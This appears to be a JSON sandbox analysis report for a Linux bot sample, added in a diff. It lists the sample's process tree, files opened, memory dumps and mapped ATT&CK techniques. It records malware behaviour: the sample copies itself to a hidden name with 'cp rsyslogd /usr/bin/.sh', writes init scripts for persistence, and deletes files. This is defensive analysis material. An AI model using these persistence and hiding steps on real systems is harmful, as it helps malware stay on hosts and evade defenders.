+                                                                 "name":  "/usr/lib/rsyslog/rsyslog-rotate",
+                                                                 "children":  [
+                                                                                  {
+                                                                                      "process_id":  "4938",
+                                                                                      "name":  "/usr/bin/systemctl systemctl kill -s HUP rsyslog.service",
+                                                                                      "files_opened":  [
+                                                                                                           "/proc/4938/stat"
+                                                                                                       ]
+                                                                                  }
+                                                                              ]
+                                                             }
+                                                         ]
+                                        },
+                                        {
+                                            "process_id":  "4967",
+                                            "name":  "/tmp/bot.x86",
+                                            "children":  [
+                                                             {
+                                                                 "process_id":  "4968",
+                                                                 "name":  "/tmp/bot.x86 -",
+                                                                 "children":  [
+                                                                                  {
+                                                                                      "process_id":  "4969",
+                                                                                      "name":  "/tmp/bot.x86 -",
+                                                                                      "children":  [
+                                                                                                       {
+                                                                                                           "process_id":  "4970",
+                                                                                                           "name":  "/bin/sh sh -c -- \"cp rsyslogd /usr/bin/.sh\"",
+                                                                                                           "children":  [
+                                                                                                                            "@{process_id=4971; name=/usr/bin/cp cp rsyslogd /usr/bin/.sh; files_opened=System.Object[]}"
+                                                                                                                        ]
+                                                                                                       },
+                                                                                                       {
+                                                                                                           "process_id":  "4972",
+                                                                                                           "name":  "/tmp/bot.x86 -",
+                                                                                                           "children":  [
+                                                                                                                            "@{process_id=4973; name=/tmp/bot.x86 -; files_opened=System.Object[]}",
+                                                                                                                            "@{process_id=4974; name=/tmp/bot.x86 -; files_opened=System.Object[]; files_deleted=System.Object[]}"
+                                                                                                                        ]
+                                                                                                       }
+                                                                                                   ],
+                                                                                      "files_opened":  [
+                                                                                                           "/etc/init.d/sysd",
+                                                                                                           "/etc/rc.local",
+                                                                                                           "/proc",
+                                                                                                           "/proc/1/cmdline",
+                                                                                                           "/proc/2/cmdline",
+                                                                                                           "/proc/3/cmdline",
+                                                                                                           "/proc/4/cmdline",
+                                                                                                           "/proc/4969/fd/0"
+                                                                                                       ],
+                                                                                      "files_written":  [
+                                                                                                            "/etc/init.d/sysd"
+                                                                                                        ],
+                                                                                      "files_deleted":  [
+                                                                                                            "//rsyslogd"
+                                                                                                        ]
+                                                                                  }
+                                                                              ]
+                                                             }
+                                                         ]
+                                        }
+                                    ],
+                 "files_opened":  [
+                                      "/bin",
+                                      "/boot",
+                                      "/boot/grub",
+                                      "/boot/grub/fonts",
+                                      "/boot/grub/i386-pc",
+                                      "/data/local/tmp",
+                                      "/dev/block",
+                                      "/dev/bus",
+                                      "/dev/bus/usb",
+                                      "/dev/bus/usb/001",
+                                      "/dev/bus/usb/002",
+                                      "/dev/char",
+                                      "/dev/cpu",
+                                      "/dev/cpu/0",
+                                      "/dev/cpu/1",
+                                      "/dev/disk",
+                                      "/dev/disk/by-partuuid",
+                                      "/dev/disk/by-path",
+                                      "/dev/disk/by-uuid",
+                                      "/dev/hugepages",
+                                      "/dev/input",
+                                      "/dev/input/by-id",
+                                      "/dev/input/by-path",
+                                      "/dev/lightnvm",
+                                      "/dev/mapper",
+                                      "/dev/mqueue",
+                                      "/dev/net",
+                                      "/dev/pts",
+                                      "/dev/shm",
+                                      "/dev/snd",
+                                      "/dev/vfio",
+                                      "/dev/virtio-ports",
+                                      "/etc/init.d/sysd",
+                                      "/etc/rc.local",
+                                      "/home",
+                                      "/home/lonestar",
+                                      "/home/lonestar/Desktop",
+                                      "/home/lonestar/Documents",
+                                      "/home/lonestar/Downloads",
+                                      "/home/lonestar/Music",
+                                      "/home/lonestar/Pictures",
+                                      "/home/lonestar/Public",
+                                      "/home/lonestar/Templates",
+                                      "/home/lonestar/Videos",
+                                      "/lib/systemd/tls/avx512_1/libc.so.6",
+                                      "/lib/systemd/tls/avx512_1/x86_64/libc.so.6",
+                                      "/lib/systemd/tls/haswell/avx512_1/libc.so.6",
+                                      "/lib/systemd/tls/haswell/avx512_1/x86_64/libc.so.6",
+                                      "/lib/systemd/tls/haswell/libc.so.6",
+                                      "/lib/systemd/tls/haswell/x86_64/libc.so.6",
+                                      "/mnt",
+                                      "/proc",
+                                      "/proc/1/cmdline",
+                                      "/proc/1/environ",
+                                      "/proc/1/sched",
+                                      "/proc/10/maps",
+                                      "/proc/100/maps",
+                                      "/proc/1000/maps",
+                                      "/proc/1001/maps",
+                                      "/proc/1004/maps",
+                                      "/proc/1007/maps",
+                                      "/proc/101/maps",
+                                      "/proc/1010/maps",
+                                      "/proc/1018/maps",
+                                      "/proc/102/maps",
+                                      "/proc/1023/maps",
+                                      "/proc/1026/maps",
+                                      "/proc/1027/maps",
+                                      "/proc/103/maps",
+                                      "/proc/1030/maps",
+                                      "/proc/1032/maps",
+                                      "/proc/1037/maps",
+                                      "/proc/104/maps",
+                                      "/proc/1041/maps",
+                                      "/proc/1048/maps",
+                                      "/proc/1049/maps",
+                                      "/proc/105/maps",
+                                      "/proc/1054/maps",
+                                      "/proc/106/maps",
+                                      "/proc/1061/maps",
+                                      "/proc/1069/maps",
+                                      "/proc/107/maps",
+                                      "/proc/1071/maps",
+                                      "/proc/1074/maps",
+                                      "/proc/108/maps",
+                                      "/proc/1089/maps",
+                                      "/proc/1096/maps",
+                                      "/proc/1098/maps",
+                                      "/proc/11/maps",
+                                      "/proc/1112/maps",
+                                      "/proc/1122/maps",
+                                      "/proc/1127/maps",
+                                      "/proc/1139/maps",
+                                      "/proc/1165/maps",
+                                      "/proc/117/maps",
+                                      "/proc/12/maps",
+                                      "/proc/120/maps",
+                                      "/proc/1204/maps",
+                                      "/proc/1219/maps",
+                                      "/proc/1240/maps",
+                                      "/proc/1244/maps",
+                                      "/proc/13/maps",
+                                      "/proc/133/maps",
+                                      "/proc/14/maps",
+                                      "/proc/15/maps",
+                                      "/proc/16/maps",
+                                      "/proc/17/maps",
+                                      "/proc/177/maps",
+                                      "/proc/178/maps",
+                                      "/proc/179/maps",
+                                      "/proc/18/maps",
+                                      "/proc/180/maps",
+                                      "/proc/181/maps",
+                                      "/proc/182/maps",
+                                      "/proc/183/maps",
+                                      "/proc/184/maps",
+                                      "/proc/185/maps",
+                                      "/proc/186/maps",
+                                      "/proc/187/maps",
+                                      "/proc/188/maps",
+                                      "/proc/189/maps",
+                                      "/proc/19/maps",
+                                      "/proc/190/maps",
+                                      "/proc/191/maps",
+                                      "/proc/192/maps",
+                                      "/proc/193/maps",
+                                      "/proc/194/maps",
+                                      "/proc/198/maps",
+                                      "/proc/2/cmdline",
+                                      "/proc/2/maps",
+                                      "/proc/20/maps",
+                                      "/proc/204/maps",
+                                      "/proc/209/maps",
+                                      "/proc/21/maps",
+                                      "/proc/22/maps",
+                                      "/proc/23/maps",
+                                      "/proc/231/maps",
+                                      "/proc/234/maps",
+                                      "/proc/238/maps",
+                                      "/proc/24/maps",
+                                      "/proc/25/maps",
+                                      "/proc/26/maps",
+                                      "/proc/262/maps",
+                                      "/proc/27/maps",
+                                      "/proc/28/maps",
+                                      "/proc/29/maps",
+                                      "/proc/3/cmdline",
+                                      "/proc/3/maps",
+                                      "/proc/30/maps",
+                                      "/proc/304/maps",
+                                      "/proc/306/maps",
+                                      "/proc/307/maps",
+                                      "/proc/3258/maps",
+                                      "/proc/3259/maps",
+                                      "/proc/3260/maps",
+                                      "/proc/3261/maps",
+                                      "/proc/34/maps",
+                                      "/proc/340/maps",
+                                      "/proc/376/maps",
+                                      "/proc/396/maps",
+                                      "/proc/4/cmdline",
+                                      "/proc/4/maps",
+                                      "/proc/4749/maps",
+                                      "/proc/4844/maps",
+                                      "/proc/4856/maps",
+                                      "/proc/4857/maps",
+                                      "/proc/4858/maps",
+                                      "/proc/4859/maps",
+                                      "/proc/4860/maps",
+                                      "/proc/4861/maps",
+                                      "/proc/4862/maps",
+                                      "/proc/4863/maps",
+                                      "/proc/4864/maps",
+                                      "/proc/4865/maps",
+                                      "/proc/4866/maps",
+                                      "/proc/4867/maps",
+                                      "/proc/4915/maps",
+                                      "/proc/4916/maps",
+                                      "/proc/4933/stat",
+                                      "/proc/4938/stat",
+                                      "/proc/4969/fd/0",
+                                      "/proc/4972/maps",
+                                      "/proc/4973/maps",
+                                      "/proc/4973/net/tcp",
+                                      "/proc/4973/net/tcp6",
+                                      "/proc/4974/maps",
+                                      "/proc/5/maps",
+                                      "/proc/516/maps",
+                                      "/proc/517/maps",
+                                      "/proc/518/maps",
+                                      "/proc/519/maps",
+                                      "/proc/520/maps",
+                                      "/proc/565/maps",
+                                      "/proc/567/maps",
+                                      "/proc/578/maps",
+                                      "/proc/580/maps",
+                                      "/proc/585/maps",
+                                      "/proc/593/maps",
+                                      "/proc/597/maps",
+                                      "/proc/6/maps"
+                                  ],
+                 "memory_pattern_domains":  [
+                                                "bugs.launchpad.net"
+                                            ],
+                 "memory_dumps":  [
+                                      {
+                                          "file_name":  "4968.1.0000000009d30000.0000000009d52000.rw-.sdmp",
+                                          "process":  "/tmp/bot.x86",
+                                          "size":  "139264",
+                                          "base_address":  "164962304",
+                                          "stage":  "MEM_STAGE_EXIT",
+                                          "process_id":  "4968"
+                                      },
+                                      {
+                                          "file_name":  "4967.1.00000000f7f21000.00000000f7f22000.r-x.sdmp",
+                                          "process":  "/tmp/bot.x86",
+                                          "size":  "4096",
+                                          "base_address":  "4159840256",
+                                          "stage":  "MEM_STAGE_EXIT",
+                                          "process_id":  "4967"
+                                      },
+                                      {
+                                          "file_name":  "4967.1.000000000811e000.0000000008129000.rw-.sdmp",
+                                          "process":  "/tmp/bot.x86",
+                                          "size":  "45056",
+                                          "base_address":  "135434240",
+                                          "stage":  "MEM_STAGE_EXIT",
+                                          "process_id":  "4967"
+                                      },
+                                      {
+                                          "file_name":  "4969.1.00000000f7f21000.00000000f7f22000.r-x.sdmp",
+                                          "process":  "/tmp/bot.x86",
+                                          "size":  "4096",
+                                          "base_address":  "4159840256",
+                                          "stage":  "MEM_STAGE_EXIT",
+                                          "process_id":  "4969"
+                                      },
+                                      {
+                                          "file_name":  "4967.1.00000000ffb83000.00000000ffba4000.rw-.sdmp",
+                                          "process":  "/tmp/bot.x86",
+                                          "size":  "135168",
+                                          "base_address":  "4290396160",
+                                          "stage":  "MEM_STAGE_EXIT",
+                                          "process_id":  "4967"
+                                      },
+                                      {
+                                          "file_name":  "4968.1.0000000008049000.00000000080de000.r-x.sdmp",
+                                          "process":  "/tmp/bot.x86",
+                                          "size":  "610304",
+                                          "base_address":  "135127040",
+                                          "stage":  "MEM_STAGE_EXIT",
+                                          "process_id":  "4968"
+                                      },
+                                      {
+                                          "file_name":  "4969.1.0000000008049000.00000000080de000.r-x.sdmp",
+                                          "process":  "/tmp/bot.x86",
+                                          "size":  "610304",
+                                          "base_address":  "135127040",
+                                          "stage":  "MEM_STAGE_EXIT",
+                                          "process_id":  "4969"
+                                      },
+                                      {
+                                          "file_name":  "4968.1.00000000ffb83000.00000000ffba4000.rw-.sdmp",
+                                          "process":  "/tmp/bot.x86",
+                                          "size":  "135168",
+                                          "base_address":  "4290396160",
+                                          "stage":  "MEM_STAGE_EXIT",
+                                          "process_id":  "4968"
+                                      },
+                                      {
+                                          "file_name":  "4968.1.000000000811c000.000000000811e000.rw-.sdmp",
+                                          "process":  "/tmp/bot.x86",
+                                          "size":  "8192",
+                                          "base_address":  "135389184",
+                                          "stage":  "MEM_STAGE_EXIT",
+                                          "process_id":  "4968"
+                                      },
+                                      {
+                                          "file_name":  "4968.1.000000000811e000.0000000008129000.rw-.sdmp",
+                                          "process":  "/tmp/bot.x86",
+                                          "size":  "45056",
+                                          "base_address":  "135434240",
+                                          "stage":  "MEM_STAGE_EXIT",
+                                          "process_id":  "4968"
+                                      },
+                                      {
+                                          "file_name":  "4967.1.000000000811c000.000000000811e000.rw-.sdmp",
+                                          "process":  "/tmp/bot.x86",
+                                          "size":  "8192",
+                                          "base_address":  "135389184",
+                                          "stage":  "MEM_STAGE_EXIT",
+                                          "process_id":  "4967"
+                                      },
+                                      {
+                                          "file_name":  "4967.1.0000000008049000.00000000080de000.r-x.sdmp",
+                                          "process":  "/tmp/bot.x86",
+                                          "size":  "610304",
+                                          "base_address":  "135127040",
+                                          "stage":  "MEM_STAGE_EXIT",
+                                          "process_id":  "4967"
+                                      },
+                                      {
+                                          "file_name":  "4969.1.0000000009d30000.0000000009d51000.rw-.sdmp",
+                                          "process":  "/tmp/bot.x86",
+                                          "size":  "135168",
+                                          "base_address":  "164958208",
+                                          "stage":  "MEM_STAGE_EXIT",
+                                          "process_id":  "4969"
+                                      },
+                                      {
+                                          "file_name":  "4968.1.00000000f7f21000.00000000f7f22000.r-x.sdmp",
+                                          "process":  "/tmp/bot.x86",
+                                          "size":  "4096",
+                                          "base_address":  "4159840256",
+                                          "stage":  "MEM_STAGE_EXIT",
+                                          "process_id":  "4968"
+                                      },
+                                      {
+                                          "file_name":  "4969.1.000000000811e000.0000000008129000.rw-.sdmp",
+                                          "process":  "/tmp/bot.x86",
+                                          "size":  "45056",
+                                          "base_address":  "135434240",
+                                          "stage":  "MEM_STAGE_EXIT",
+                                          "process_id":  "4969"
+                                      },
+                                      {
+                                          "file_name":  "4967.1.0000000009d30000.0000000009d52000.rw-.sdmp",
+                                          "process":  "/tmp/bot.x86",
+                                          "size":  "139264",
+                                          "base_address":  "164962304",
+                                          "stage":  "MEM_STAGE_EXIT",
+                                          "process_id":  "4967"
+                                      },
+                                      {
+                                          "file_name":  "4969.1.00000000ffb83000.00000000ffba4000.rw-.sdmp",
+                                          "process":  "/tmp/bot.x86",
+                                          "size":  "135168",
+                                          "base_address":  "4290396160",
+                                          "stage":  "MEM_STAGE_EXIT",
+                                          "process_id":  "4969"
+                                      },
+                                      {
+                                          "file_name":  "4969.1.000000000811c000.000000000811e000.rw-.sdmp",
+                                          "process":  "/tmp/bot.x86",
+                                          "size":  "8192",
+                                          "base_address":  "135389184",
+                                          "stage":  "MEM_STAGE_EXIT",
+                                          "process_id":  "4969"
+                                      }
+                                  ],
+                 "attack_techniques":  {
+                                           "T1027":  [
+                                                         {
+                                                             "severity":  "INFO",
+                                                             "description":  "encode data using XOR",
+                                                             "refs":  [
+                                                                          {
+                                                                              "ref":  "#signature_matches",
+                                                                              "value":  "0"
+                                                                          }
+                                                                      ]
+                                                         },
+                                                         {
+                                                             "severity":  "INFO",
+                                                             "description":  "encrypt data using RC4 PRGA",
+                                                             "refs":  [
+                                                                          {
+                                                                              "ref":  "#signature_matches",
+                                                                              "value":  "3"
+                                                                          }
+                                                                      ]
+                                                         }
+                                                     ],
+                                           "T1064":  [
+                                                         {
+                                                             "severity":  "INFO",
+                                                             "description":  "Executes commands using a shell command-line interpreter",
+                                                             "refs":  [
+                                                                          {
+                                                                              "ref":  "#signature_matches",
+                                                                              "value":  "2075"
+                                                                          }
+                                                                      ]
+                                                         },
+                                                         {
+                                                             "severity":  "INFO",
+                                                             "description":  "Found strings indicative of a multi-platform dropper",
+                                                             "refs":  [
+                                                                          {
+                                                                              "ref":  "#signature_matches",
+                                                                              "value":  "5013"
+                                                                          }
+                                                                      ]
+                                                         }
+                                                     ],
+                                           "T1543.002":  [
+                                                             {
+                                                                 "severity":  "INFO",
+                                                                 "description":  "Executes the \"systemctl\" command used for controlling the systemd system and service manager",
+                                                                 "refs":  [
+                                                                              {
+                                                                                  "ref":  "#signature_matches",
+                                                                                  "value":  "4032"
+                                                                              }
+                                                                          ]
+                                                             }
+                                                         ],
+                                           "T1036":  [
+                                                         {
+                                                             "severity":  "LOW",
+                                                             "description":  "Drops files in suspicious directories",
+                                                             "refs":  [
+                                                                          {
+                                                                              "ref":  "#signature_matches",
+                                                                              "value":  "4041"
+                                                                          }
+                                                                      ]
+                                                         }
+                                                     ],
+                                           "T1222":  [
+                                                         {
+                                                             "severity":  "INFO",
+                                                             "description":  "Sample tries to set the executable flag",
+                                                             "refs":  [
+                                                                          {
+                                                                              "ref":  "#signature_matches",
+                                                                              "value":  "4023"
+                                                                          }
+                                                                      ]
+                                                         }
+                                                     ],
+                                           "T1070":  [
+                                                         {
+                                                             "severity":  "LOW",
+                                                             "description":  "Deletes system log files",
+                                                             "refs":  [
+                                                                          {
+                                                                              "ref":  "#signature_matches",
+                                                                              "value":  "2141"
+                                                                          }
+                                                                      ]
+                                                         }
+                                                     ],
+                                           "T1003":  [
+                                                         {
+                                                             "severity":  "INFO",
+                                                             "description":  "Enumerates processes within the \"proc\" file system",
+                                                             "refs":  [
+                                                                          {
+                                                                              "ref":  "#signature_matches",
+                                                                              "value":  "4036"
+                                                                          }
+                                                                      ]
+                                                         }
+                                                     ],
+                                           "T1001":  [
+                                                         {
+                                                             "severity":  "INFO",
+                                                             "description":  "Sample contains strings that are user agent strings indicative of HTTP manipulation",
+                                                             "refs":  [
+                                                                          {
+                                                                              "ref":  "#signature_matches",
+                                                                              "value":  "4007"
+                                                                          }
+                                                                      ]
+                                                         }
+                                                     ],
+                                           "T1571":  [
+                                                         {
+                                                             "severity":  "INFO",
+                                                             "description":  "Detected TCP or UDP traffic on non-standard ports",
+                                                             "refs":  [
+                                                                          {
+                                                                              "ref":  "#signature_matches",
+                                                                              "value":  "522"
+                                                                          }
+                                                                      ]
+                                                         }
+                                                     ],
+                                           "T1565":  [
+                                                         {
+                                                             "severity":  "LOW",
+                                                             "description":  "Sample tries to set files in /etc globally writable",
+                                                             "refs":  [
+                                                                          {
+                                                                              "ref":  "#signature_matches",
+                                                                              "value":  "4123"
+                                                                          }
+                                                                      ]
+                                                         }
+                                                     ]
+                                       }
+             }
+}
